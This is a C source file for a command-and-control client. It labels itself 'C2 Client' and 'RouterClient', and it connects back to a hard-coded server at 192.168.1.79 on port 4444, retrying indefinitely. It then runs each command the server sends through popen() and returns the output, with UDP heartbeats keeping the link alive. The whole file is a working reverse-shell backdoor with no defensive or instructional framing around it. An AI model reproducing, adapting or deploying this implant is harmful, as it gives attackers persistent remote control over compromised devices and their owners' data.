#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/time.h>
#include <signal.h>
#include <time.h>
#include <ctype.h>

#define SERVER_IP "192.168.1.79"
#define COMMAND_PORT 4444
#define HEARTBEAT_TIMEOUT 60  // Disconnect if no heartbeat for 60 seconds
#define MAX_RETRIES 0

volatile sig_atomic_t keep_running = 1;
char CLIENT_ID[33] = {0};
int HEARTBEAT_PORT = 0;  // Sarà assegnata dal sistema

void handle_signal(int sig) {
    keep_running = 0;
}

void generate_client_id() {
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        unsigned char random_bytes[16];
        if (fread(random_bytes, 1, 16, urandom) == 16) {
            for (int i = 0; i < 16; i++) {
                sprintf(CLIENT_ID + (i * 2), "%02x", random_bytes[i]);
            }
            CLIENT_ID[32] = '\0';
            fclose(urandom);
            return;
        }
        fclose(urandom);
    }

    srand((unsigned int)(time(NULL) ^ getpid() ^ clock()));
    for (int i = 0; i < 16; i++) {
        int v = rand() & 0xFF;
        sprintf(CLIENT_ID + (i * 2), "%02x", v);
    }
    CLIENT_ID[32] = '\0';
}

int connect_with_retry(int port) {
    int sock;
    struct sockaddr_in server_addr;
    int retries = 0;

    while (keep_running && (MAX_RETRIES == 0 || retries < MAX_RETRIES)) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("[!] socket failed");
            sleep(5);
            retries++;
            continue;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);

        if (inet_aton(SERVER_IP, &server_addr.sin_addr) == 0) {
            struct hostent *server = gethostbyname(SERVER_IP);
            if (!server) {
                fprintf(stderr, "[!] DNS resolution failed\n");
                close(sock);
                sleep(5);
                retries++;
                continue;
            }
            memcpy(&server_addr.sin_addr, server->h_addr, server->h_length);
        }

        struct timeval timeout = {10, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

        printf("[*] Connecting to %s:%d (attempt %d)...\n",
               SERVER_IP, port, retries + 1);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            fprintf(stderr, "[!] Connection failed: %s\n", strerror(errno));
            close(sock);

            int wait_time = 5 * (1 << (retries < 4 ? retries : 4));
            if (wait_time > 60) wait_time = 60;

            printf("[*] Retrying in %d seconds...\n", wait_time);
            sleep(wait_time);
            retries++;
            continue;
        }

        printf("[+] Connected successfully to command port!\n");
        return sock;
    }

    return -1;
}

int main() {
    char buffer[1024];
    int command_sock = -1;
    int heartbeat_sock = -1;
    struct sockaddr_in heartbeat_addr, server_addr, local_addr;
    socklen_t addr_len = sizeof(local_addr);
    time_t last_heartbeat = 0;

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    printf("[C2 Client] Starting with dynamic heartbeat port...\n");

    // Genera l'ID del client
    generate_client_id();
    printf("[*] Client ID: %s\n", CLIENT_ID);

    while (keep_running) {
        // 1. Connect to command port (TCP)
        command_sock = connect_with_retry(COMMAND_PORT);
        if (command_sock < 0) {
            printf("[!] Could not establish command connection, exiting.\n");
            return 1;
        }

        // 2. Create UDP socket for heartbeat and bind to ANY port (port 0)
        heartbeat_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (heartbeat_sock < 0) {
            perror("[!] UDP socket creation failed");
            close(command_sock);
            return 1;
        }

        // Allow reuse of address
        int opt = 1;
        setsockopt(heartbeat_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        // Bind to all interfaces on ANY port (port 0 = sistema sceglie)
        memset(&heartbeat_addr, 0, sizeof(heartbeat_addr));
        heartbeat_addr.sin_family = AF_INET;
        heartbeat_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        heartbeat_addr.sin_port = htons(0);  // Porta 0 = assegnazione automatica

        if (bind(heartbeat_sock, (struct sockaddr*)&heartbeat_addr, sizeof(heartbeat_addr)) < 0) {
            perror("[!] Bind on heartbeat port failed");
            close(command_sock);
            close(heartbeat_sock);
            return 1;
        }

        // Get the actual port assigned by the system
        getsockname(heartbeat_sock, (struct sockaddr*)&local_addr, &addr_len);
        HEARTBEAT_PORT = ntohs(local_addr.sin_port);

        printf("[+] UDP heartbeat socket bound to port %d (dynamically assigned)\n", HEARTBEAT_PORT);

        // Set timeout for UDP socket
        struct timeval tv = {1, 0};
        setsockopt(heartbeat_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        // 3. Handshake on command port (includi l'ID del client e la porta heartbeat)
        char handshake[256];
        snprintf(handshake, sizeof(handshake), "HELLO|RouterClient|v1.0|%s|%d",
                 CLIENT_ID, HEARTBEAT_PORT);
        printf("[*] Sending handshake with client ID and heartbeat port %d...\n", HEARTBEAT_PORT);

        if (send(command_sock, handshake, strlen(handshake), MSG_NOSIGNAL) < 0) {
            printf("[!] Handshake failed, reconnecting...\n");
            close(command_sock);
            close(heartbeat_sock);
            sleep(5);
            continue;
        }

        // 4. Receive READY
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(command_sock, buffer, sizeof(buffer)-1, 0);
        if (bytes <= 0) {
            printf("[!] Handshake failed, reconnecting...\n");
            close(command_sock);
            close(heartbeat_sock);
            sleep(5);
            continue;
        }

        buffer[bytes] = '\0';
        printf("[+] Server: %s\n", buffer);

        // Reset heartbeat timer
        last_heartbeat = time(NULL);

        // Get server address for heartbeat verification
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(HEARTBEAT_PORT);
        if (inet_aton(SERVER_IP, &server_addr.sin_addr) == 0) {
            struct hostent *server = gethostbyname(SERVER_IP);
            if (server) {
                memcpy(&server_addr.sin_addr, server->h_addr, server->h_length);
            }
        }

        // 5. Main loop with select on both sockets
        printf("[*] Entering main loop...\n");
        printf("[*] Listening for commands on port %d\n", COMMAND_PORT);
        printf("[*] Listening for heartbeats on port %d\n", HEARTBEAT_PORT);

        while (keep_running) {
            fd_set readfds;
            struct timeval tv_select;
            int max_fd, retval;

            FD_ZERO(&readfds);
            FD_SET(command_sock, &readfds);
            FD_SET(heartbeat_sock, &readfds);

            max_fd = (command_sock > heartbeat_sock) ? command_sock : heartbeat_sock;

            tv_select.tv_sec = 1;
            tv_select.tv_usec = 0;

            retval = select(max_fd + 1, &readfds, NULL, NULL, &tv_select);

            if (retval == -1) {
                if (errno == EINTR) break;
                perror("[!] select() error");
                break;
            }

            time_t now = time(NULL);
            if (difftime(now, last_heartbeat) > HEARTBEAT_TIMEOUT) {
                printf("[!] No heartbeat for %.0f seconds, reconnecting...\n",
                       difftime(now, last_heartbeat));
                break;
            }

            if (FD_ISSET(heartbeat_sock, &readfds)) {
                struct sockaddr_in from_addr;
                socklen_t from_len = sizeof(from_addr);
                memset(buffer, 0, sizeof(buffer));
                bytes = recvfrom(heartbeat_sock, buffer, sizeof(buffer)-1, 0,
                                 (struct sockaddr*)&from_addr, &from_len);

                if (bytes > 0) {
                    buffer[bytes] = '\0';
                    if (from_addr.sin_addr.s_addr == server_addr.sin_addr.s_addr) {
                        last_heartbeat = now;
                        static int hb_count = 0;
                        if (++hb_count <= 10) {
                            printf("[*] Heartbeat %d received at %ld\n", hb_count, now);
                        } else if (hb_count % 20 == 0) {
                            printf("[*] Heartbeat count: %d\n", hb_count);
                        }
                    } else {
                        printf("[!] Received heartbeat from unknown source: %s\n",
                               inet_ntoa(from_addr.sin_addr));
                    }
                }
            }

            if (FD_ISSET(command_sock, &readfds)) {
                memset(buffer, 0, sizeof(buffer));
                bytes = recv(command_sock, buffer, sizeof(buffer)-1, 0);

                if (bytes <= 0) {
                    printf("[!] Command connection lost, reconnecting...\n");
                    break;
                }

                buffer[bytes] = '\0';

                if (strstr(buffer, "EXIT") != NULL) {
                    printf("[*] Exit command received\n");
                    send(command_sock, "Goodbye!", 8, MSG_NOSIGNAL);
                    close(command_sock);
                    close(heartbeat_sock);
                    return 0;
                }

                printf("[*] Executing command: %s", buffer);
                FILE *fp = popen(buffer, "r");
                if (fp) {
                    char output[4096] = {0};
                    char line[256];
                    while (fgets(line, sizeof(line), fp)) {
                        if (strlen(output) + strlen(line) < sizeof(output) - 1) {
                            strcat(output, line);
                        }
                    }
                    pclose(fp);
                    if (strlen(output) == 0) {
                        strcpy(output, "OK\n");
                    }
                    send(command_sock, output, strlen(output), MSG_NOSIGNAL);
                    printf("[+] Command executed, sent %zu bytes\n", strlen(output));
                } else {
                    send(command_sock, "ERROR: Command failed\n", 22, MSG_NOSIGNAL);
                }
            }
        }

        close(command_sock);
        close(heartbeat_sock);
        printf("[*] Reconnecting in 5 seconds...\n");
        sleep(5);
    }

    if (command_sock >= 0) close(command_sock);
    if (heartbeat_sock >= 0) close(heartbeat_sock);

    printf("[*] Client shutting down...\n");
    return 0;
}